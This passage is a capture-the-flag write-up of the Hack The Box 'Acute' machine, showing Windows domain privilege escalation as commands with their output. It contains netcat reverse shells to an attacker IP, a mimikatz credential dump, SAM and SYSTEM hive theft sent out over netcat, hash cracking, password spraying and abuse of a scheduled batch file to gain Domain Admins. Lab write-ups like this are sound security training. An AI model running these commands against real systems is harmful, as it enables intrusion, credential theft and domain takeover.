> The **Just Enough Administration (JEA)** feature is available starting from [PowerShell version](https://woshub.com/check-powershell-version-installed/) 5.0 and allows you to delegate administrative privileges to anything you can manage with PowerShell. The main purpose of PowerShell JEA is to limit privileges. JEA allows you to grant non-admin users permissions to perform specific administrative tasks without giving them server or service administrator rights (AD, Exchange, SharePoint, etc.). Using JEA, you can set which users can run specific cmdlets, functions or PowerShell scripts with admin privileges and log all actions (similar to [PowerShell command history](https://woshub.com/powershell-commands-history/)). (From [https://woshub.com/using-powershell-just-enough-administration-jea/](https://woshub.com/using-powershell-just-enough-administration-jea/))

**TLDR: JEA is to limit what a domain user can or can't do. (Principle of Least Privilege)**

**In our Meterpreter reverse shell, if we type the exact PowerShell script, we get the exact error message from the screenshots:**
```shell
meterpreter > shell
[...]
C:\Users\edavies\Documents>powershell
[...]
PS C:\Users\edavies\Documents> $passwd = ConvertTo-SecureString "{Redacted}" -AsPlainText -Force
PS C:\Users\edavies\Documents> $cred = New-Object System.Management.Automation.PSCredential ("acute\imonks",$passwd)
PS C:\Users\edavies\Documents> Enter-PSSession -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
Enter-PSSession : The term 'Measure-Object' is not recognized as the name of a cmdlet, function, script file, or 
operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try 
again.
At line:1 char:1
+ Enter-PSSession -ComputerName ATSSERVER -ConfigurationName dc_manage  ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (Measure-Object:String) [Enter-PSSession], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
```

As you can see, the command `Measure-Object` is not recognized.

According to [Microsoft](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/enter-pssession-cmdlet-fails-psmodulepath-variable), it's because: **"When a PowerShell session is created and authenticates through Kerberos, the session doesn't support double hop. So, the PowerShell session can't authenticate by using network resources."**

So, maybe the JEA configuration `dc_manage` has some issues, an issue with [Kerberos Double Hop](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/understanding-kerberos-double-hop/ba-p/395463), or both.

Now, instead of start an interactive session with the Domain Controller as domain user `imonks`, **we can just use `Invoke-Command` to execute PowerShell commands on the Domain Controller as domain user `imonks`:**

```shell
PS C:\Users\edavies\Documents> Invoke-Command -Computer ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock { whoami }
acute\imonks
```

Nice, we can execute commands as domain user `imonks`!

**user.txt:**
```shell
PS C:\Users\edavies\Documents> Invoke-Command -Computer ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock { cat C:\Users\imonks\Desktop\user.txt }
{Redacted}
```

## Privilege Escalation

### `ATSSERVER` imonks to `Acute-PC01` jmorgan

**However, I can't get a reverse shell as domain user `imonks`:**
```shell
PS C:\Users\edavies\Documents> Invoke-Command -Computer ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.19/revshell_imonks.ps1')"}
The term 'cmd.exe' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the 
spelling of the name, or if a path was included, verify that the path is correct and try again.
    + CategoryInfo          : ObjectNotFound: (cmd.exe:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
    + PSComputerName        : ATSSERVER
```

So... Because of the JEA's `dc_session` configuration, we're in a very **limited shell** as domain user `imonks`, like **lots of PowerShell commands can't be used**.

**When I got the user flag, I found an interesting PowerShell script in `C:\Users\imonks\Desktop\`:**
```shell
PS C:\Users\edavies\Documents> Invoke-Command -Computer ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock { ls C:\Users\imonks\Desktop }
[...]
Mode                 LastWriteTime         Length Name                               PSComputerName                    
----                 -------------         ------ ----                               --------------                    
-ar---         8/15/2023   5:59 AM             34 user.txt                           ATSSERVER                         
-a----         1/11/2022   6:04 PM            602 wm.ps1                             ATSSERVER
```

**What's that `wm.ps1` script?**
```powershell
$securepasswd = '01000000d08[...]c51'
$passwd = $securepasswd | ConvertTo-SecureString
$creds = New-Object System.Management.Automation.PSCredential ("acute\jmorgan", $passwd)
Invoke-Command -ScriptBlock {Get-Volume} -ComputerName Acute-PC01 -Credential $creds
```

Oh! **We found domain user `jmorgan` secure password!!**

This PowerShell script will run a PowerShell command `Get-Volume` ***on computer `Acute-PC01` as domain user `jmorgan`.***

**However, we can't just convert the secure string back to plaintext because of JEA's `dc_session` configuration:**
```shell
PS C:\Users\edavies\Documents> Invoke-Command -Computer ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock { $securepasswd = '01000000d08[...]c51'; $passwd = $securepasswd | ConvertTo-SecureString; $creds = New-Object System.Management.Automation.PSCredential ("acute\jmorgan", $passwd); $creds.GetNetworkCredential().Password }
The term 'ConvertTo-SecureString' is not recognized as the name of a cmdlet, function, script file, or operable 
program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
    + CategoryInfo          : ObjectNotFound: (ConvertTo-SecureString:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
    + PSComputerName        : ATSSERVER
 
The term 'New-Object' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the 
spelling of the name, or if a path was included, verify that the path is correct and try again.
    + CategoryInfo          : ObjectNotFound: (New-Object:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
    + PSComputerName        : ATSSERVER
 
You cannot call a method on a null-valued expression.
    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
    + FullyQualifiedErrorId : InvokeMethodOnNull
    + PSComputerName        : ATSSERVER
```

**Hmm... How about modifying the script using `Set-Content`...**
```shell
PS C:\Users\edavies\Documents> Invoke-Command -Computer ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock { (Get-Content -Path C:\Users\imonks\Desktop\wm.ps1) -replace "Get-Volume", "whoami /all" | Set-Content -Path C:\Users\imonks\Desktop\wm.ps1}
```

**Now try to run the `wm.ps1` PowerShell script:**
```shell
PS C:\Users\edavies\Documents> Invoke-Command -Computer ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock { C:\Users\imonks\Desktop\wm.ps1 }
USER INFORMATION
----------------

User Name     SID                                           
============= ==============================================
acute\jmorgan S-1-5-21-1786406921-1914792807-2072761762-1108
[...]
```

It worked! We can **execute commands as domain user `jmorgan` on `Acute-PC01`!**

**In the group information, we actually see that domain user `jmorgan` is a member of Administrators local group on `Acute-PC01`:** (Which also can be found in `Acute-PC01`'s edavies PowerShell reverse shell session)
```shell
[...]
GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes                                                     
========================================== ================ ============ ===============================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group             
BUILTIN\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
[...]
```

**That being said, we can get a reverse shell as `jmorgan` on `Acute-PC01` as a member of `Administrators` group via uploading a netcat executable in `C:\Utils\` and modifying `wm.ps1` script!**

- Upload netcat executable to `C:\Utils\` on `Acute-PC01`:

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.15|16:03:10(HKT)]
└> file /opt/static-binaries/binaries/windows/x64/nc.exe 
/opt/static-binaries/binaries/windows/x64/nc.exe: PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows, 7 sections
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.15|16:03:19(HKT)]
└> python3 -m http.server -d /opt/static-binaries/binaries/windows/x64/ 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```shell
PS > iwr -Uri http://10.10.14.19/nc.exe -OutFile C:\Utils\nc.exe
```

- Test the netcat executable is working or not:

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.15|16:05:11(HKT)]
└> rlwrap -cAr nc -lvnp 4443
listening on [any] 4443 ...
```

```shell
PS > C:\Utils\nc.exe -nv 10.10.14.19 4443 -e powershell.exe
```

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.15|16:05:11(HKT)]
└> rlwrap -cAr nc -lvnp 4443
listening on [any] 4443 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.11.145] 49832
[...]
PS C:\Users\edavies\Documents> 
```

It's working.

- Exit the testing reverse shell session and setup a new netcat listener:

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.15|16:07:23(HKT)]
└> rlwrap -cAr nc -lvnp 4443
listening on [any] 4443 ...
```

- Modify the `wm.ps1` script to the netcat reverse shell payload:

```shell
PS C:\Users\edavies\Documents> Invoke-Command -Computer ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock { (Get-Content -Path C:\Users\imonks\Desktop\wm.ps1) -replace "whoami /all", "C:\Utils\nc.exe -nv 10.10.14.19 4443 -e powershell.exe" | Set-Content -Path C:\Users\imonks\Desktop\wm.ps1 }
PS C:\Users\edavies\Documents> Invoke-Command -Computer ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock { cat C:\Users\imonks\Desktop\wm.ps1 }
$securepasswd = '01000000d08[...]c51'
$passwd = $securepasswd | ConvertTo-SecureString
$creds = New-Object System.Management.Automation.PSCredential ("acute\jmorgan", $passwd)
Invoke-Command -ScriptBlock {C:\Utils\nc.exe -nv 10.10.14.19 4443 -e powershell.exe} -ComputerName Acute-PC01 -Credential $creds
```

- Run the modified `wm.ps1` script:

```shell
Invoke-Command -Computer ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock { C:\Users\imonks\Desktop\wm.ps1 }
```

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.15|16:07:23(HKT)]
└> rlwrap -cAr nc -lvnp 4443
listening on [any] 4443 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.11.145] 49841
[...]
PS C:\Users\jmorgan\Documents> whoami; ipconfig /all
acute\jmorgan

Windows IP Configuration

   Host Name . . . . . . . . . . . . : Acute-PC01
   Primary Dns Suffix  . . . . . . . : acute.local
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : acute.local

Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Microsoft Hyper-V Network Adapter #2
   Physical Address. . . . . . . . . : 00-15-5D-E8-0A-01
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::9513:4361:23ec:64fd%14(Preferred) 
   IPv4 Address. . . . . . . . . . . : 172.16.22.2(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.22.1
   DHCPv6 IAID . . . . . . . . . . . : 251663709
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-29-29-1F-44-00-15-5D-E8-02-00
   DNS Servers . . . . . . . . . . . : 172.16.22.1
[...]
```

I'm user `jmorgan` on `Acute-PC01`!

### `Acute-PC01` jmorgan to `ATSSERVER` awallace

**After enumerating user `jmorgan`'s profile, I found nothing interesting:**
```shell
PS C:\Users\jmorgan\Documents> gci -Recurse C:\Users\jmorgan\
[...]
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-r---        07/12/2019     09:14                Desktop                                                              
d-r---        21/12/2021     22:50                Documents                                                            
d-r---        07/12/2019     09:14                Downloads                                                            
d-r---        07/12/2019     09:14                Favorites                                                            
d-r---        07/12/2019     09:14                Links                                                                
d-r---        07/12/2019     09:14                Music                                                                
d-r---        07/12/2019     09:14                Pictures                                                             
d-----        07/12/2019     09:14                Saved Games                                                          
d-r---        07/12/2019     09:14                Videos                                                               
```

Now, a quick question: What is the first thing would you do after gaining administrator access in a domain-joined client workstation?

You guessed! **Dumping password hashes via [mimikatz](https://github.com/ParrotSec/mimikatz)!**

- Transfer mimikatz executable to `Acute-PC01`:

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.15|16:12:25(HKT)]
└> file /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
/usr/share/windows-resources/mimikatz/x64/mimikatz.exe: PE32+ executable (console) x86-64, for MS Windows, 6 sections
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.15|16:12:30(HKT)]
└> python3 -m http.server -d /usr/share/windows-resources/mimikatz/x64/ 80            
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```shell
PS C:\Users\jmorgan\Documents> iwr -Uri http://10.10.14.19/mimikatz.exe -OutFile C:\Utils\mimikatz.exe
```

- Dump password hashes via `sekurlsa::logonpasswords`:

```shell
PS C:\Users\jmorgan\Documents> C:\Utils\mimikatz.exe
[...]
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # sekurlsa::logonpasswords
[...]
Authentication Id : 0 ; 159931 (00000000:000270bb)
Session           : Interactive from 1
User Name         : edavies
Domain            : ACUTE
Logon Server      : ATSSERVER
Logon Time        : 15/08/2023 06:00:42
SID               : S-1-5-21-1786406921-1914792807-2072761762-1106
	msv :	
	 [00000003] Primary
	 * Username : edavies
	 * Domain   : ACUTE
	 * NTLM     : {Redacted}
	 * SHA1     : {Redacted}
	 * DPAPI    : {Redacted}
[...]
```

However, there's no other recently logged in domain users' hashes except `edavies`...

Let's take a step back. We need to **find which domain user is a member of `Domain Admins` group.**

**Enumerate domain users:**
```shell
PS > Invoke-Command -Computer ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock { net user /domain }
[...]
-------------------------------------------------------------------------------
Administrator            awallace                 chall                    
edavies                  Guest                    imonks                   
jmorgan                  krbtgt                   lhopkins                 
```

- Domain user: `awallace`, `chall`, `edavies`, `imonks`, `jmorgan`, `lhopkins`

**Enumerate members of `Domain Admins` group:**
```shell
PS > Invoke-Command -Computer ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock { net localgroup Administrators }
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
```

Looks like only `Administrator` on the Domain Controller is a member of `Domain Admins` group?

**After poking around at the `jmorgan` reverse shell session, I realized that there's a local user called `Natasha`:**
```shell
PS C:\Users\jmorgan\Documents> ls C:\Users\
[...]
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
[...]                                                            
d-----        19/11/2021     09:29                Natasha                                                              
[...]
```

Hmm... I wonder what's this user's password.

**Luckily, since we're an administrator user in `Acute-PC01`, we can extract the hive from registry, which holds all the local accounts' NTLM password hash:**
```shell
PS C:\Users\jmorgan\Documents> ls $env:SystemRoot\System32\config\SAM
[...]
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----        08/02/2022     00:09          65536 SAM                                                                  

PS C:\Users\jmorgan\Documents> ls $env:SystemRoot\System32\config\SYSTEM
[...]
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----        08/02/2022     02:30       13107200 SYSTEM
```

> The Security Account Manager (SAM) is a database that is present on computers running Windows operating systems that stores user accounts and security descriptors for users on the local computer. (From [https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-sam](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-sam))

- Make a copy of `SAM` and `SYSTEM` file:

```shell
PS C:\Users\jmorgan\Documents> reg save HKLM\SAM C:\Utils\SAM.bak
The operation completed successfully.
PS C:\Users\jmorgan\Documents> reg save HKLM\SYSTEM C:\Utils\SYSTEM.bak
The operation completed successfully.
```

> Note: If you don't make a copy of them, you can't access those files, because they're being used by another process.

- Transfer the backed up SAM and SYSTEM file **via the uploaded netcat executable** to our attacker machine:

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.15|16:45:54(HKT)]
└> nc -lnvp 9999 > SAM                                                                            
listening on [any] 9999 ...
```

```shell
PS C:\Users\jmorgan\Documents> cat C:\Utils\SAM.bak | C:\Utils\nc.exe -w 10 10.10.14.19 9999
```

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.15|16:51:33(HKT)]
└> nc -lnvp 9999 > SYSTEM
listening on [any] 9999 ...
```

```shell
PS C:\Users\jmorgan\Documents> cat C:\Utils\SYSTEM.bak | C:\Utils\nc.exe -w 60 10.10.14.19 9999
```

> Note: The timeout is set to 60 seconds is because the `SYSTEM` file is kinda big (11.58 MB).

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.15|16:51:57(HKT)]
└> file SAM && file SYSTEM
SAM: MS Windows registry file, NT/2000 or above
SYSTEM: MS Windows registry file, NT/2000 or above
```

**Or you can transfer them via Meterpreter's `download` command:**
```shell
meterpreter > download C:\\Utils\\SAM.bak
[...]
[*] Downloaded 56.00 KiB of 56.00 KiB (100.0%): C:\Utils\SAM.bak -> /home/siunam/ctf/htb/Machines/Acute/SAM.bak
[*] Completed  : C:\Utils\SAM.bak -> /home/siunam/ctf/htb/Machines/Acute/SAM.bak
meterpreter > download C:\\Utils\\SYSTEM.bak
[...]
[*] Downloaded 11.58 MiB of 11.58 MiB (100.0%): C:\Utils\SYSTEM.bak -> /home/siunam/ctf/htb/Machines/Acute/SYSTEM.bak
[*] Completed  : C:\Utils\SYSTEM.bak -> /home/siunam/ctf/htb/Machines/Acute/SYSTEM.bak
```

- Generate and crack the password hashes via [Impacket](https://github.com/fortra/impacket)'s `secretsdump` and [`john`](https://github.com/openwall/john):

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.15|17:09:11(HKT)]
└> impacket-secretsdump -sam SAM.bak -system SYSTEM.bak LOCAL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x44397c32a634e3d8d8f64bff8c614af7
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:{Redacted}:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:{Redacted}:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:{Redacted}:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:{Redacted}:::
Natasha:1001:aad3b435b51404eeaad3b435b51404ee:{Redacted}:::
[*] Cleaning up...
```

**Let's try to crack those hashes!**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.15|17:10:34(HKT)]
└> cat << EOF > Acute-PC01.hash  
heredoc> Administrator:500:aad3b435b51404eeaad3b435b51404ee:{Redacted}:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:{Redacted}:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:{Redacted}:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:{Redacted}:::
Natasha:1001:aad3b435b51404eeaad3b435b51404ee:{Redacted}:::
heredoc> EOF
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.15|17:10:46(HKT)]
└> john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT Acute-PC01.hash 
[...]
{Redacted}     (Administrator)
[...]
```

Nice! We cracked `Administrator`'s password NT hash!

But... We're already an administrator in `Acute-PC01`...

Ah ha! ***Password reuse?***

Maybe there's a domain user reused this password?

**Let's do password spraying to the Domain Controller on the `edavies` reverse shell session!**

**In my first attempt, domain user `awallace` worked!**
```shell
PS C:\Users\edavies\Documents> $passwd1 = ConvertTo-SecureString "{Redacted}" -AsPlainText -Force
PS C:\Users\edavies\Documents> $cred1 = New-Object System.Management.Automation.PSCredential ("acute\awallace",$passwd1)
PS C:\Users\edavies\Documents> Invoke-Command -Computer ATSSERVER -Credential $cred1 -ConfigurationName dc_manage -ScriptBlock { whoami }
acute\awallace
```

So domain user `awallace` is reusing the local `Administrator` built-in user in `Acute-PC01`.

Hmm... What can we do now...

### `ATSSERVER` awallace to `ATSSERVER` `Domain Admins`

**After enumerating a little bit, I found there's a weird, non-standard Windows software installed in `C:\Program Files\`:**
```shell
PS > Invoke-Command -Computer ATSSERVER -Credential $cred1 -ConfigurationName dc_manage -ScriptBlock { ls "C:\Program Files"}
[...]
Mode                 LastWriteTime         Length Name                               PSComputerName                    
----                 -------------         ------ ----                               --------------                    
d-----        12/21/2021  12:04 AM                common files                       ATSSERVER                         
d-----        12/21/2021  12:11 AM                Hyper-V                            ATSSERVER                         
d-----         9/15/2018   8:12 AM                internet explorer                  ATSSERVER                         
d-----          2/1/2022   7:41 PM                keepmeon                           ATSSERVER                         
d-----        12/21/2021  12:04 AM                VMware                             ATSSERVER                         
d-----        12/20/2021   9:19 PM                Windows Defender                   ATSSERVER                         
d-----        12/20/2021   9:12 PM                Windows Defender Advanced Threat   ATSSERVER                         
                                                  Protection                                                           
d-----        12/21/2021   2:13 PM                WindowsPowerShell                  ATSSERVER                         
```

`keepmeon`??

**And inside there, a `keepmeon.bat` Batch file can be found:**
```shell
PS > Invoke-Command -Computer ATSSERVER -Credential $cred1 -ConfigurationName dc_manage -ScriptBlock { ls "C:\Program Files\keepmeon"}
[...]
Mode                 LastWriteTime         Length Name                               PSComputerName                    
----                 -------------         ------ ----                               --------------                    
-a----        12/21/2021   2:57 PM            128 keepmeon.bat                       ATSSERVER
```

**`keepmeon.bat`:**
```batch
REM This is run every 5 minutes. For Lois use ONLY
@echo off
 for /R %%x in (*.bat) do (
 if not "%%x" == "%~0" call "%%x"
)
```

**Since I know nothing about Batch scripting, I decided to left this to ChatGPT:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Acute/images/Pasted%20image%2020230815173330.png)

> In summary, this script executes all the `.bat` files found in the current directory and its subdirectories, excluding the script file itself.

Hmm... That being said, **we can create any `.bat` files in `C:\Program Files\keepmeon\`, it'll be executed every 5 minutes?**

Also, the Batch script's comment says it's for Lois (`lhopkins`) user only...

If you recalled correctly, **Lois is the only user who can change group membership, and only this user can be the site admin.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Acute/images/Pasted%20image%2020230814181914.png)

**So, is there any site admin related group?**
```shell
PS > Invoke-Command -Computer ATSSERVER -Credential $cred1 -ConfigurationName dc_manage -ScriptBlock { net group /domain }

Group Accounts for \\

-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Group Policy Creator Owners
*Key Admins
*Managers
*Protected Users
*Read-only Domain Controllers
*Schema Admins
*Site_Admin
```

**Oh! There's a `Site_Admin` group:**
```shell
PS > Invoke-Command -Computer ATSSERVER -Credential $cred1 -ConfigurationName dc_manage -ScriptBlock { net group Site_Admin /domain }
Group name     Site_Admin
Comment        Only in the event of emergencies is this to be populated. This has access to Domain Admin group

Members

-------------------------------------------------------------------------------
The command completed successfully.
```

In the comment, it says **this `Site_Admin` group has access to `Domain Admin` group!**

Armed with above information, **we can escalate our privilege to `Domain Admins` group via changing a domain user's group membership to `Site_Admin`!**

**To do so, we can create a Batch script in `C:\Program Files\keepmeon\`!**
```batch
net group Site_Admin awallace /add /domain
```

This will add the `Site_Admin` group to domain user `awallace`.

```shell
PS > Invoke-Command -Computer ATSSERVER -Credential $cred1 -ConfigurationName dc_manage -ScriptBlock { Set-Content -Path "C:\Program Files\keepmeon\add_to_site_admin.bat" -Value "net group site_admin awallace /add /domain" }
PS > Invoke-Command -Computer ATSSERVER -Credential $cred1 -ConfigurationName dc_manage -ScriptBlock { cat "C:\Program Files\keepmeon\add_to_site_admin.bat" }
net group Site_Admin awallace /add /domain
```

> Note: You can add `Site_Admin` group to any domain user.

**After waiting for 5 minutes or so, `awallace` domain user has `Site_Admin` group:**
```shell
PS > Invoke-Command -Computer ATSSERVER -Credential $cred1 -ConfigurationName dc_manage -ScriptBlock { net group Site_Admin /domain }
Group name     Site_Admin
Comment        Only in the event of emergencies is this to be populated. This has access to Domain Admin group

Members

-------------------------------------------------------------------------------
awallace                 
The command completed successfully.
PS > Invoke-Command -Computer ATSSERVER -Credential $cred1 -ConfigurationName dc_manage -ScriptBlock { whoami /groups }

GROUP INFORMATION
-----------------

Group Name                                   Type             SID                                            Attributes                                                     
============================================ ================ ============================================== ===============================================================
Everyone                                     Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group             
BUILTIN\Users                                Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group             
BUILTIN\Pre-Windows 2000 Compatible Access   Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group             
BUILTIN\Certificate Service DCOM Access      Alias            S-1-5-32-574                                   Mandatory group, Enabled by default, Enabled group             
BUILTIN\Administrators                       Alias            S-1-5-32-544                                   Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                         Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\Authenticated Users             Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\This Organization               Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group             
ACUTE\Domain Admins                          Group            S-1-5-21-1786406921-1914792807-2072761762-512  Mandatory group, Enabled by default, Enabled group             
ACUTE\Managers                               Group            S-1-5-21-1786406921-1914792807-2072761762-1111 Mandatory group, Enabled by default, Enabled group             
ACUTE\Site_Admin                             Group            S-1-5-21-1786406921-1914792807-2072761762-2102 Mandatory group, Enabled by default, Enabled group             
Authentication authority asserted identity   Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group             
ACUTE\Denied RODC Password Replication Group Alias            S-1-5-21-1786406921-1914792807-2072761762-572  Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\High Mandatory Level         Label            S-1-16-12288
```

I'm a member of `Domain Admins` group now!

**We can also get a reverse shell as `Domain Admins` on `ATSSERVER` (`awallace` with `Site_Admin` domain group, Optional).**

**Since we're a member of `Domain Admins` group, we don't need to supply `dc_manage` configuration anymore!**
```shell
PS > Invoke-Command -Computer ATSSERVER -Credential $cred1 -ScriptBlock { whoami /priv }

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State  
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```

Therefore, the JEA is gone and we can use any PowerShell commands we want, like `Invoke-WebRequest`.

**Let's transfer netcat executable to the Domain Controller, and get a reverse shell:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.15|18:16:56(HKT)]
└> file /opt/static-binaries/binaries/windows/x64/nc.exe      
/opt/static-binaries/binaries/windows/x64/nc.exe: PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows, 7 sections
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.15|18:16:59(HKT)]
└> python3 -m http.server -d /opt/static-binaries/binaries/windows/x64/ 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

- Transfer netcat to `ATSSERVER`:

```shell
PS > Invoke-Command -Computer ATSSERVER -Credential $cred1 -ScriptBlock { Invoke-WebRequest -Uri http://10.10.14.19/nc.exe -OutFile C:\Windows\Temp\nc.exe }
```

- Setup a netcat listener:

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.15|18:18:00(HKT)]
└> rlwrap -cAr nc -lvnp 4445
listening on [any] 4445 ...
```

- Send the netcat reverse shell payload:

```shell
PS > Invoke-Command -Computer ATSSERVER -Credential $cred1 -ScriptBlock { C:\Windows\Temp\nc.exe -nv 10.10.14.19 4445 -e powershell.exe }
```

- Profit:

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Acute)-[2023.08.15|18:18:00(HKT)]
